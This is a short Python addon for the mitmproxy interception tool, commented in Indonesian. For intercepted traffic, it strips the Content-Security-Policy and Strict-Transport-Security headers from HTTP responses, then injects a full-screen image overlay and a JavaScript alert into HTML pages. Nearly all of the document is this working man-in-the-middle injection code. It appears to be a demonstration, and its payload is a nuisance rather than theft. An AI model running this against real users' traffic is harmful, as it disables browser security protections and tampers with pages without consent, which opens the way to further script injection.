# Overlay_HTML merupakan elemen HTML dalam bentuk byte yang akan disisipkan ke dalam halaman HTML
Overlay_HTML = b"<img style='z-index:10000;width:100%;top:0;left:0;position:fixed;opacity:0.5'" \
               b"src='https://www.uslawshield.com/wp-content/uploads/2023/07/img3.jpg'/>"

# Overlay_JS merupakan skrip JavaScript dalam bentuk byte yang akan menampilkan alert pada halaman
Overlay_JS = b"<script>alert('You can not click anything on this page')</script>"

# Fungsi untuk menghapus header tertentu dari respons HTTP
def remove_header(response, header_name):
    if header_name in response.headers:
        del response.headers[header_name]

# Fungsi yang akan dijalankan oleh mitmproxy untuk memanipulasi respons
def response(flow):
    # Hapus beberapa header keamanan jika ada
    remove_header(flow.response, "Content-Security-Policy")
    remove_header(flow.response, "Strict-Transport-Security")

    # Jika 'content-type' tersedia dalam respons dan merupakan HTML,
    # serta status respons adalah 200 OK, maka sisipkan elemen HTML dan skrip JavaScript
    if "content-type" in flow.response.headers and "text/html" in flow.response.headers["content-type"] and flow.response.status_code == 200:
        flow.response.content += Overlay_HTML
        flow.response.content += Overlay_JS
